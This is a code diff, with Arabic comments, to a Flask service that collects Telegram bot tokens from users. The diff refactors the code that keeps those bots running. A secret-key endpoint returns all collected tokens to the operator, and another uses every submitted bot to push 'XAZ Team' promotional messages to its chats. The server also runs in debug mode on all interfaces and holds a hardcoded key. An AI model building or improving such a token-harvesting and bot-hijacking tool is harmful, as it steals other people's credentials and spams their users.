@@ -14,7 +14,6 @@ SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy1919282882729728273838
 # دالة للتحقق من صحة التوكن
 def is_valid_token(token):
     try:
-        # استخدام API Telegram للتحقق من صحة التوكن
         url = f"https://api.telegram.org/bot{token}/getMe"
         response = requests.get(url)
         return response.status_code == 200 and response.json().get("ok", False)
@@ -28,11 +27,13 @@ def start_bot(token):
 
     @bot_instance.message_handler(func=lambda message: True)
     def handle_message(message):
-        # تجاهل الرسائل الأخرى
-        pass
+        pass  # تجاهل الرسائل
 
-    # بدء الاستماع للرسائل
-    bot_instance.polling(none_stop=True, skip_pending=True)
+    thread = threading.Thread(target=bot_instance.polling, kwargs={"none_stop": True, "skip_pending": True})
+    thread.daemon = True  # التأكد من إغلاقه عند إنهاء التطبيق
+    thread.start()
+
+    bots[token] = {"instance": bot_instance, "thread": thread}
 
 # API لإضافة توكن
 @app.route('/add_bot', methods=['POST'])
@@ -43,36 +44,28 @@ def add_bot():
     if not token:
         return jsonify({'error': 'Token is required'}), 400
 
-    # التحقق من صحة التوكن
     if not is_valid_token(token):
         return jsonify({'error': 'Invalid token'}), 400
 
-    # تخزين البوت وبدء تشغيله
-    bots[token] = {'status': 'active'}
-    threading.Thread(target=start_bot, args=(token,)).start()
+    if token in bots:
+        return jsonify({'message': 'Bot already running'}), 200
 
+    start_bot(token)
     return jsonify({'message': 'Bot added successfully', 'token': token})
 
 # API لاستعادة جميع التوكنات باستخدام مفتاح سري
 @app.route('/get_tokens', methods=['GET'])
 def get_tokens():
-    # التحقق من المفتاح السري
-    provided_key = request.args.get('key')
-    if provided_key != SECRET_KEY:
+    if request.args.get('key') != SECRET_KEY:
         return jsonify({'error': 'Unauthorized'}), 401
-
-    # إرجاع جميع التوكنات
     return jsonify({'tokens': list(bots.keys())})
 
-# API لإرسال الرسالة إلى جميع البوتات
-@app.route('/send_message_xx', methods=['GET'])
+# API لإرسال رسالة لجميع البوتات
+@app.route('/send_message_xx', methods=['POST'])
 def send_message():
-    # التحقق من المفتاح السري
-    provided_key = request.args.get('xazoe9e0ey393eioeeu')
-    if provided_key != SECRET_KEY:
+    if request.json.get('key') != SECRET_KEY:
         return jsonify({'error': 'Unauthorized'}), 401
 
-    # الرسالة الأساسية بالعربية
     message_text = (
         "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
         "**🔹 XAZ Team Official Links 🔹**\n"
@@ -84,38 +77,34 @@ def send_message():
         "Stay safe and always verify official sources! 💙"
     )
 
-    # إرسال الرسالة إلى جميع البوتات
-    for token in bots.keys():
-        bot_instance = telebot.TeleBot(token)
+    success_count = 0
+
+    for token, data in bots.items():
+        bot_instance = data["instance"]
         try:
-            # إرسال الرسالة إلى جميع الدردشات التي يتفاعل معها البوت
             updates = bot_instance.get_updates()
             for update in updates:
-                chat_id = update.message.chat.id
-                bot_instance.send_message(chat_id, message_text, parse_mode='Markdown', disable_web_page_preview=True)
+                if update.message:
+                    bot_instance.send_message(update.message.chat.id, message_text, parse_mode="Markdown")
+                    success_count += 1
         except Exception as e:
             print(f"Error sending message with bot {token}: {e}")
 
-    return jsonify({'message': 'Message sent to all bots successfully'})
+    return jsonify({'message': f'Message sent successfully to {success_count} chats'})
 
 # API لإيقاف جميع البوتات
 @app.route('/stop_bots', methods=['POST'])
 def stop_bots():
-    # التحقق من المفتاح السري
-    provided_key = request.json.get('key')
-    if provided_key != SECRET_KEY:
+    if request.json.get('key') != SECRET_KEY:
         return jsonify({'error': 'Unauthorized'}), 401
 
-    # إيقاف جميع البوتات
-    for token in bots.keys():
-        bot_instance = telebot.TeleBot(token)
+    for token, data in bots.items():
+        bot_instance = data["instance"]
         bot_instance.stop_polling()
 
-    # مسح جميع التوكنات
     bots.clear()
-
     return jsonify({'message': 'All bots stopped successfully'})
 
 # تشغيل سيرفر Flask
 if __name__ == '__main__':
-    app.run(port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
